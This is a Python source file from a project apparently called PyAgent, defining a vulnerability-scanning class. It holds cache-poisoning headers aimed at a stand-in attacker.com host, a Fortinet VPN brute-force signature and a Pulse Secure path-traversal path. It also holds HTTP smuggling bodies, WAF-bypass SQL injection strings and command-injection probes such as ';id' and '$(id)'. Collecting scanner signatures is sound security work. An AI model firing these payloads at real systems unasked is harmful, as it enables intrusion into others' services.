#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import aiohttp
import json
from typing import Dict, List, Optional, Any
from src.core.base.logic.logger import logger

class VulnerabilityIntelligence:
    """Intelligence engine for vulnerability scanning (OSV API, CVE signatures, and exploitation patterns)."""

    def __init__(self, session: Optional[aiohttp.ClientSession] = None):
        self.session = session
        self.osv_api_url = "https://api.osv.dev/v1/query"

    async def _get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()
        return self.session

    def get_cache_poisoning_gadgets(self) -> List[Dict[str, Any]]:
        """Gadgets for testing Web Cache Poisoning (Ported from fockcache)."""
        return [
            {
                "name": "Unkeyed Host Header",
                "headers": {"X-Forwarded-Host": "attacker.com"},
                "description": "Injects a malicious host into the cached page template."
            },
            {
                "name": "Unkeyed Scheme Header",
                "headers": {"X-Forwarded-Scheme": "http"},
                "description": "Forces a redirect or resource load over insecure protocol."
            },
            {
                "name": "Vary Header Bypass",
                "headers": {"User-Agent": "Evil/1.0", "X-Forwarded-Host": "attacker.com"},
                "description": "Testing if varying headers like User-Agent prevent poisoning."
            }
        ]

    def get_vpn_vuln_signatures(self) -> Dict[str, Dict]:
        """Signatures for VPN and Gateway appliance vulnerabilities (Ported from fortinet-ssl-vpn-bruteforce)."""
        return {
            "fortinet_vpn_bruteforce": {
                "login_path": "/remote/logincheck",
                "params": ["username", "credential", "ajax=1"],
                "success_indicator": r"redir=.*&portal=",
                "fingerprint_path": "/remote/login?lang=en",
                "fingerprint_keyword": "fortinet"
            },
            "pulse_secure_file_read": {
                "cve": "CVE-2019-11510",
                "path": "/dana-na/../config/settings.7z",
                "severity": "CRITICAL"
            },
            "sonicwall_sma_rce": {
                "cve": "CVE-2021-20016",
                "description": "SQL injection in login page leading to RCE",
                "severity": "CRITICAL"
            }
        }

    def get_cve_signatures(self) -> Dict[str, Dict[str, Any]]:
        """Returns a registry of critical CVE signatures for rapid identification."""
        return {
            "CVE-2021-44228": {
                "name": "Log4Shell",
                "pattern": r"\$\{jndi:(ldap|rmi|ldaps|dns):.*\}",
                "severity": "CRITICAL"
            },
            "CVE-2022-41040": {
                "name": "ProxyNotShell (Exchange)",
                "path": "/autodiscover/autodiscover.json",
                "severity": "CRITICAL"
            },
            "CVE-2023-3519": {
                "name": "Citrix ADC RCE",
                "path": "/gwtest/formssso",
                "severity": "CRITICAL"
            },
            "CVE-2023-23397": {
                "name": "Outlook NTLM Leak",
                "method": "Sent via PidLidReminderFileParameter",
                "severity": "HIGH"
            },
            "CVE-2023-25194": {
                "name": "Kafka Connect RCE",
                "description": "JNDI injection via sasl.jaas.config",
                "severity": "CRITICAL"
            },
            "CVE-2023-0001": {
                "name": "vRealize Log Insight RCE",
                "description": "Chain of CVE-2022-31704, CVE-2022-31706, CVE-2022-31711",
                "port": 16520,
                "severity": "CRITICAL"
            }
        }

    def get_http_smuggling_gadgets(self) -> List[Dict[str, Any]]:
        """Returns gadgets for testing HTTP Request Smuggling (TE.CL, CL.TE, etc.)."""
        return [
            {"name": "CL.TE", "headers": {"Content-Length": "4", "Transfer-Encoding": "chunked"}, "body": "1\r\nZ\r\n0\r\n\r\n"},
            {"name": "TE.CL", "headers": {"Content-Length": "6", "Transfer-Encoding": "chunked"}, "body": "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\n"},
            {"name": "TE.TE (Obfuscated)", "headers": {"Transfer-Encoding": "chunked, identity"}, "body": "0\r\n\r\n"},
            {
                "name": "WebSocket Smuggling (Scenario 1)",
                "description": "Exploits misconfigured proxies that ignore Sec-WebSocket-Version and status codes.",
                "headers": {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                    "Sec-WebSocket-Version": "1337"
                },
                "method": "GET"
            },
            {
                "name": "WebSocket Smuggling (Scenario 2 - SSRF)",
                "description": "Exploits proxies that only validate status 101 via an SSRF to a malicious backend.",
                "headers": {
                    "Upgrade": "websocket",
                    "Connection": "Upgrade",
                    "X-Payload": "SSRF to return HTTP 101"
                },
                "method": "POST"
            }
        ]

    def get_waf_bypass_patterns(self) -> List[str]:
        """Returns patterns for bypassing WAFs in web requests."""
        return [
            "/*!50000SELECT*/",  # MySQL version comment
            "UN/**/ION SELECT",  # Whitespace bypass
            "%27%20OR%201=1%20--", # URL encoded 1=1
            "X-Forwarded-For: 127.0.0.1", # Spoofing source
            "X-Originating-IP: 127.0.0.1",
            "X-Custom-IP-Authorization: 127.0.0.1"
        ]

    def get_rce_payloads(self) -> List[str]:
        """A collection of generic RCE payloads for various environments."""
        return [
            ';${@print(md5(rce))}',
            ';${@print(md5("rce"))}',
            '%253B%2524%257B%2540print%2528md5%2528%2522rce%2522%2529%2529%257D%253B',
            ';uname -a;',
            '&& dir',
            '&& type C:\\boot.ini',
            ';phpinfo();',
            ';id',
            '|id',
            '`id`',
            '$(id)'
        ]

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
